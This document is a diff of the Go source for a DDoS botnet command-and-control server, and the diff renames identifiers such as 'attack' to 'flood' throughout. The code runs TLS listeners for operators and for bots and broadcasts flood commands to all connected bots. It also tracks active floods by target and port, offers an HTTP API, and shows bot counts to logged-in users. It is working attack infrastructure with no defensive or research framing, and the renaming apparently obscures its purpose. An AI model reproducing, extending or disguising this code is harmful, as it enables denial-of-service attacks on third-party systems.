@@ -13,134 +13,134 @@ import (
 )
 
 var (
-	bots = newBotReg()
-	pool = newConnPool(capPool)
+	swarm = newHive()
+	cpool = newConnCache(maxPool)
 
-	liveAttacks = make(map[net.Conn]attack)
-	atkMu       sync.Mutex
+	running = make(map[net.Conn]flood)
+	runMu   sync.Mutex
 
-	apiAttacks = make(map[string]attack)
-	apiAtkMu   sync.RWMutex
+	apiJobs = make(map[string]flood)
+	apiMu   sync.RWMutex
 
-	history []attack
-	histMu  sync.Mutex
+	hist   []flood
+	histMu sync.Mutex
 
-	connectedUsers []*userConn
-	clientsMu      sync.RWMutex
+	clients []*client
+	cliMu   sync.RWMutex
 
-	connLimiter = make(chan struct{}, capConns)
-	semaphore   = make(chan struct{}, 100)
+	connSem   = make(chan struct{}, maxConns)
+	workerSem = make(chan struct{}, 100)
 )
 
-func broadcast(cmd cmdPayload) {
-	raw := cmdToBytes(cmd)
-	p := mkPacket(pktCmd, raw)
-	enc, err := encodePkt(p)
+func floodAll(c cmd) {
+	raw := marshalCmd(c)
+	w := newMsg(msgCmd, raw)
+	enc, err := encodeMsg(w)
 	if err != nil {
 		return
 	}
-	all := bots.All()
-	for _, c := range all {
-		go func(conn net.Conn) {
-			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-			conn.Write(enc)
-		}(c)
+	all := swarm.Conns()
+	for _, conn := range all {
+		go func(cn net.Conn) {
+			cn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+			cn.Write(enc)
+		}(conn)
 	}
 }
 
-func allOngoing() []attack {
-	var out []attack
-	atkMu.Lock()
-	for _, a := range liveAttacks {
+func activeFloods() []flood {
+	var out []flood
+	runMu.Lock()
+	for _, a := range running {
 		if time.Now().Before(a.started.Add(a.dur)) {
 			out = append(out, a)
 		}
 	}
-	atkMu.Unlock()
-	apiAtkMu.RLock()
-	for _, a := range apiAttacks {
+	runMu.Unlock()
+	apiMu.RLock()
+	for _, a := range apiJobs {
 		if time.Now().Before(a.started.Add(a.dur)) {
 			out = append(out, a)
 		}
 	}
-	apiAtkMu.RUnlock()
+	apiMu.RUnlock()
 	return out
 }
 
-func trackAPIAttack(a attack) {
-	apiAtkMu.Lock()
-	apiAttacks[a.target+":"+a.port] = a
-	apiAtkMu.Unlock()
+func trackAPIFlood(a flood) {
+	apiMu.Lock()
+	apiJobs[a.target+":"+a.port] = a
+	apiMu.Unlock()
 	go func() {
 		time.Sleep(a.dur)
-		apiAtkMu.Lock()
-		delete(apiAttacks, a.target+":"+a.port)
-		apiAtkMu.Unlock()
+		apiMu.Lock()
+		delete(apiJobs, a.target+":"+a.port)
+		apiMu.Unlock()
 	}()
 }
 
-func updateTitles() {
+func titleLoop() {
 	for {
 		time.Sleep(10 * time.Second)
-		clientsMu.RLock()
-		cnt := botCount()
-		for _, uc := range connectedUsers {
-			setTermTitle(uc.conn, fmt.Sprintf("Bots: %d | User: %s", cnt, uc.acct.Username))
+		cliMu.RLock()
+		cnt := nodeCount()
+		for _, uc := range clients {
+			pushTitle(uc.conn, fmt.Sprintf("Bots: %d | User: %s", cnt, uc.user.Username))
 		}
-		clientsMu.RUnlock()
+		cliMu.RUnlock()
 	}
 }
 
-func handleUser(c *tls.Conn) {
+func serveClient(c *tls.Conn) {
 	defer c.Close()
 	ip := c.RemoteAddr().(*net.TCPAddr).IP.String()
-	if !checkConnLimit(ip) {
+	if !grabConn(ip) {
 		c.Write([]byte("\033[0;31m[!] too many connections\033[0m\r\n"))
 		return
 	}
-	defer releaseConn(ip)
+	defer freeConn(ip)
 
-	ok, uc := doLogin(c)
+	ok, uc := loginFlow(c)
 	if !ok || uc == nil {
 		return
 	}
 
-	clientsMu.Lock()
-	connectedUsers = append(connectedUsers, uc)
-	clientsMu.Unlock()
+	cliMu.Lock()
+	clients = append(clients, uc)
+	cliMu.Unlock()
 	defer func() {
-		clientsMu.Lock()
-		for i, u := range connectedUsers {
+		cliMu.Lock()
+		for i, u := range clients {
 			if u == uc {
-				connectedUsers = append(connectedUsers[:i], connectedUsers[i+1:]...)
+				clients = append(clients[:i], clients[i+1:]...)
 				break
 			}
 		}
-		clientsMu.Unlock()
+		cliMu.Unlock()
 	}()
 
-	logUsr("INFO", uc.acct.Username, "connected", ip, nil)
-	cmdLoop(c, uc)
-	logUsr("INFO", uc.acct.Username, "disconnected", ip, nil)
+	userLog("INFO", uc.user.Username, "connected", ip, nil)
+	commandLoop(c, uc)
+	userLog("INFO", uc.user.Username, "disconnected", ip, nil)
 }
 
 func main() {
-	initTokens()
-	setupLogger(logsDir)
-	if err := loadACL(); err != nil {
+	initSessions()
+	initLog(logDir)
+	if err := loadPerms(); err != nil {
 		log.Fatalf("acl: %v", err)
 	}
-	setupThrottle()
+	initRL()
 
-	go updateTitles()
-	go scheduleDiags()
-	go runPulseCheck()
-	go gcQuotas()
-	go gcLoginAttempts()
-	go gcConnCounts()
-	pool.StartGC(30 * time.Second)
+	go titleLoop()
+	go diagLoop()
+	go pulseLoop()
+	go sweepQuotas()
+	go sweepLogins()
+	go sweepConns()
+	cpool.RunGC(30 * time.Second)
 
-	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
+	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
 	if err != nil {
 		log.Fatalf("cert: %v", err)
 	}
@@ -149,10 +149,10 @@ func main() {
 		MinVersion:   tls.VersionTLS13,
 	}
 
-	api := newAPISrv(listenAPI)
-	go api.Start()
+	httpd = newHTTPAPI(addrAPI)
+	go httpd.Serve()
 
-	uln, err := tls.Listen("tcp", listenUser, tc)
+	uln, err := tls.Listen("tcp", addrUser, tc)
 	if err != nil {
 		log.Fatalf("user listen: %v", err)
 	}
@@ -162,11 +162,11 @@ func main() {
 			if err != nil {
 				continue
 			}
-			go handleUser(c.(*tls.Conn))
+			go serveClient(c.(*tls.Conn))
 		}
 	}()
 
-	bln, err := tls.Listen("tcp", listenBot, tc)
+	bln, err := tls.Listen("tcp", addrBot, tc)
 	if err != nil {
 		log.Fatalf("bot listen: %v", err)
 	}
@@ -176,11 +176,11 @@ func main() {
 			if err != nil {
 				continue
 			}
-			go handleBot(c.(*tls.Conn))
+			go serveBot(c.(*tls.Conn))
 		}
 	}()
 
-	log.Printf("cnc up | users=%s bots=%s api=%s", listenUser, listenBot, listenAPI)
+	log.Printf("cnc up | users=%s bots=%s api=%s", addrUser, addrBot, addrAPI)
 
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
@@ -189,5 +189,5 @@ func main() {
 	log.Println("shutting down")
 	uln.Close()
 	bln.Close()
-	pool.Shutdown()
+	cpool.Close()
 }
